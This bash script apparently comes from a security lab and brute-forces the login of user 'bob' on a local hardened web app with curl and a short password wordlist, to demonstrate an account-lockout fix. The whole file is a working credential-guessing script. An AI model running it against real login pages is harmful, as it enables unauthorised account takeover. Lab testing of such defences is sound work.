#!/bin/bash
# Same attack, pointed at the SECURED build (port 5001). Demonstrates FIX-2:
# the account locks after 5 failed attempts, well before a real wordlist
# would succeed.

TARGET="http://127.0.0.1:5001/login"
USERNAME="bob"
WORDLIST=("123456" "password" "bob1" "letmein" "qwerty" "dragon" "iloveyou")

echo "Brute-forcing user '$USERNAME' against SECURED build: $TARGET"
COOKIES=$(mktemp)
for pass in "${WORDLIST[@]}"; do
  code=$(curl -s -o /tmp/bf_resp.html -w "%{http_code}" -b "$COOKIES" -c "$COOKIES" \
    -X POST "$TARGET" --data-urlencode "username=$USERNAME" --data-urlencode "password=$pass")
  if [ "$code" = "302" ]; then
    echo "[+] SUCCESS: $USERNAME:$pass (login accepted, HTTP 302)"
    rm -f "$COOKIES" /tmp/bf_resp.html
    exit 0
  elif grep -qi "locked" /tmp/bf_resp.html; then
    echo "[x] LOCKED OUT after attempting '$pass' - attack halted by rate limiting (FIX-2)."
    rm -f "$COOKIES" /tmp/bf_resp.html
    exit 0
  else
    echo "[-] tried $pass -> failed, HTTP $code"
  fi
done
rm -f "$COOKIES" /tmp/bf_resp.html
